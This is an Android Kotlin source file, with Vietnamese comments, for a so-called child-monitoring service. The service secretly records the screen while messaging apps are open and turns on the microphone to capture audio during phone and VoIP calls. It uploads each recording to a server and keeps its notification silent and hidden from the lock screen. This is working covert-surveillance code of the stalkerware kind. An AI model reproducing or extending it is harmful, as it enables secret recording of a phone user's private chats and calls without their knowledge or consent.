package com.example.childmonitoringapp.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.childmonitoringapp.R
import com.example.childmonitoringapp.upload.UploadWorker
import java.io.File

// Telephony + Audio mode
import android.media.AudioManager
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.telephony.PhoneStateListener

class MonitoringService : Service() {

    private val CHANNEL_ID = "MonitoringChannel"
    private val NOTIFICATION_ID = 1
    private val TAG = "MonitoringService"

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null

    private var mediaRecorder: MediaRecorder? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var recorderSurface: android.view.Surface? = null

    private var isRecording = false
    private val handler = android.os.Handler(android.os.Looper.getMainLooper())

    // ==== Mic theo trạng thái gọi ====
    private var callActive = false              // SIM call (telephony)
    private var inComm = false                  // VoIP: AudioManager.MODE_IN_COMMUNICATION
    private var wantMic = false                 // có bật MIC cho screen-rec không?

    // ==== Upload meta ====
    private var lastVideoFile: File? = null
    private var currentAppTag: String = "unknown"

    // Prefs (nếu cần dùng sau này)
    private val prefs by lazy { getSharedPreferences("mprefs", Context.MODE_PRIVATE) }

    // Cắt file theo thời gian (ví dụ 10 phút)
    private val MAX_SEGMENT_MS = 10 * 60 * 1000L
    private var rollTask: Runnable? = null

    // Poll audio mode để nhận biết VoIP
    private val audioPoll = object : Runnable {
        override fun run() {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val now = (am.mode == AudioManager.MODE_IN_COMMUNICATION)
            if (now != inComm) {
                inComm = now
                applyMicStateIfChanged("inComm=$inComm")
            }
            handler.postDelayed(this, 1000)
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.w(TAG, "onCreate()")

        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        // Telephony (SIM call) → cập nhật callActive
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            tm.registerTelephonyCallback(
                mainExecutor,
                object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                    override fun onCallStateChanged(state: Int) {
                        when (state) {
                            TelephonyManager.CALL_STATE_OFFHOOK,
                            TelephonyManager.CALL_STATE_RINGING -> {
                                if (!callActive) { callActive = true; applyMicStateIfChanged("telephony=ON") }
                            }
                            TelephonyManager.CALL_STATE_IDLE -> {
                                if (callActive) { callActive = false; applyMicStateIfChanged("telephony=OFF") }
                            }
                        }
                    }
                }
            )
        } else {
            @Suppress("DEPRECATION")
            tm.listen(object : PhoneStateListener() {
                override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                    when (state) {
                        TelephonyManager.CALL_STATE_OFFHOOK,
                        TelephonyManager.CALL_STATE_RINGING -> {
                            if (!callActive) { callActive = true; applyMicStateIfChanged("telephony=ON") }
                        }
                        TelephonyManager.CALL_STATE_IDLE -> {
                            if (callActive) { callActive = false; applyMicStateIfChanged("telephony=OFF") }
                        }
                    }
                }
            }, PhoneStateListener.LISTEN_CALL_STATE)
        }

        // Bắt đầu poll audio mode (VoIP)
        handler.post(audioPoll)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.w(TAG, "onStartCommand(): act=${intent?.action}")
        when (intent?.action) {
            ACTION_SET_PROJECTION -> {
                val rc = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
                val pd = intent.getParcelableExtra<Intent>("projectionData")
                if (rc == Activity.RESULT_OK && pd != null) {
                    mediaProjection = mediaProjectionManager.getMediaProjection(rc, pd)
                    mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                        override fun onStop() {
                            Log.w(TAG, "MediaProjection revoked by system")
                            if (isRecording) stopRecording()
                            mediaProjection = null
                        }
                    }, handler)
                    Log.w(TAG, "MediaProjection READY")
                    prefs.edit().putBoolean("hasProjection", true).apply()
                } else {
                    prefs.edit().putBoolean("hasProjection", false).apply()
                    Log.e(TAG, "SET_PROJECTION missing extras")
                }
            }

            ACTION_START_SCREEN -> {
                currentAppTag = intent.getStringExtra("appTag") ?: "unknown"
                if (mediaProjection == null) {
                    Log.e(TAG, "No MediaProjection")
                    return START_STICKY
                }
                if (!isRecording) {
                    startScreenRecording()
                    updateNotification("Đang quay màn hình ($currentAppTag)")
                }
            }

            ACTION_SPLIT_SCREEN -> {
                if (mediaProjection == null) return START_STICKY
                if (isRecording) {
                    stopRecording()
                    handler.postDelayed({ startScreenRecording() }, 200)
                } else {
                    startScreenRecording()
                }
            }

            ACTION_STOP_SCREEN -> if (isRecording) stopRecording()
        }
        startForeground(NOTIFICATION_ID, createNotification())
        return START_STICKY
    }

    // ==== MIC theo trạng thái gọi ====
    private fun shouldMic(): Boolean = callActive || inComm

    private fun applyMicStateIfChanged(reason: String) {
        val newWant = shouldMic()
        if (newWant == wantMic) return
        wantMic = newWant
        Log.d(TAG, "MIC state -> $wantMic (reason=$reason)")
        if (isRecording) {
            // split clip để phần sau có/không có MIC đúng trạng thái
            stopRecording()
            handler.postDelayed({ startScreenRecording() }, 200)
        }
    }

    // ==== Screen record (MIC theo wantMic) ====
    private fun align16(v: Int) = ((v / 16).coerceAtLeast(1)) * 16

    private fun startScreenRecording() {
        if (mediaProjection == null || isRecording) return

        val moviesDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)!!.apply { mkdirs() }
        val outFile = File(moviesDir, "screen_record_${System.currentTimeMillis()}.mp4")
        Log.d(TAG, "Saving to: ${outFile.absolutePath}")

        val dm = resources.displayMetrics
        val width  = align16(dm.widthPixels.coerceAtLeast(320))
        val height = align16(dm.heightPixels.coerceAtLeast(320))
        val densityDpi = dm.densityDpi

        // Quyết định có thu MIC hay không (tuỳ logic của bạn)
        // Nếu bạn muốn “chỉ lúc gọi mới thu”, đặt includeAudio = wantMic
        val includeAudio = wantMic

        val mr = MediaRecorder()
        mediaRecorder = mr
        try {
            // *** THỨ TỰ ĐÚNG ***
            if (includeAudio) {
                mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            }
            mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)

            if (includeAudio) {
                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                mr.setAudioEncodingBitRate(128_000)
                mr.setAudioSamplingRate(44100)
                mr.setAudioChannels(1)
            }

            mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            mr.setVideoSize(width, height)
            mr.setVideoFrameRate(20)
            mr.setVideoEncodingBitRate(2_500_000)

            mr.setOutputFile(outFile.absolutePath)

            // (tuỳ chọn) theo dõi info/error để debug
            mr.setOnInfoListener { _, what, extra ->
                Log.w(TAG, "VIDEO MR_INFO what=$what extra=$extra")
            }
            mr.setOnErrorListener { _, what, extra ->
                Log.e(TAG, "VIDEO MR_ERROR what=$what extra=$extra")
                // nếu muốn tự restart:
                try { stopRecording() } catch (_: Throwable) {}
            }

            mr.prepare()

            // surface phải lấy SAU prepare
            recorderSurface = mr.surface
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width, height, densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                recorderSurface, null, null
            ) ?: throw IllegalStateException("VirtualDisplay null")

            // lưu file hiện hành để UploadWorker dùng khi stop
            lastVideoFile = outFile

            mr.start()
            isRecording = true
            Log.d(TAG, "Screen recording started (${width}x$height @20fps, audio=$includeAudio)")

//            startRolling() // nếu bạn còn muốn cắt theo thời gian
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start recording: ${e.message}", e)
            // thu dọn sạch
            try { mr.reset(); mr.release() } catch (_: Throwable) {}
            mediaRecorder = null
            try { recorderSurface?.release() } catch (_: Throwable) {}
            recorderSurface = null
            try { virtualDisplay?.release() } catch (_: Throwable) {}
            virtualDisplay = null
            // xoá file rỗng
            runCatching { if (outFile.length() == 0L) outFile.delete() }
        }
    }

//    private fun startRolling() {
//        cancelRolling()
//        rollTask = Runnable {
//            if (isRecording) {
//                stopRecording()
//                handler.postDelayed({ startScreenRecording() }, 200)
//                startRolling()
//            }
//        }
//        handler.postDelayed(rollTask!!, MAX_SEGMENT_MS)
//    }
//
//    private fun cancelRolling() {
//        rollTask?.let { handler.removeCallbacks(it) }
//        rollTask = null
//    }

    private fun stopRecording() {
//        cancelRolling()
        mediaRecorder?.let {
            try { it.stop(); it.reset() } catch (_: Exception) {}
            it.release()
        }
        mediaRecorder = null
        virtualDisplay?.release(); virtualDisplay = null
        recorderSurface?.release(); recorderSurface = null
        isRecording = false
        Log.d(TAG, "Screen recording stopped & resources released")

        // Đẩy clip lên server
        val f = lastVideoFile
        lastVideoFile = null
        if (f != null && f.exists() && f.length() > 0) {
            UploadWorker.enqueue(
                context = this,
                path = f.absolutePath,
                app = currentAppTag,   // "zalo" / "messenger" / "telegram" / "sms" ...
                note = null,
                durationSec = null
            )
        }
    }

    // ==== Notification ====
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW
            ).apply { lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_more)
            .setContentTitle("Dịch vụ đang chạy")
            .setContentText("Theo dõi ứng dụng theo cài đặt của bạn")
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        val n = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_more)
            .setOngoing(true)
            .setSilent(true)
            .setContentTitle("Dịch vụ đang chạy")
            .setContentText(text)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
        nm.notify(NOTIFICATION_ID, n)
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(audioPoll)
        stopRecording()
        mediaProjection?.stop()
        mediaProjection = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        const val ACTION_SET_PROJECTION = "SET_PROJECTION"
        const val ACTION_START_SCREEN   = "START_SCREEN"
        const val ACTION_STOP_SCREEN    = "STOP_SCREEN"
        const val ACTION_SPLIT_SCREEN   = "SPLIT_SCREEN"
    }
}
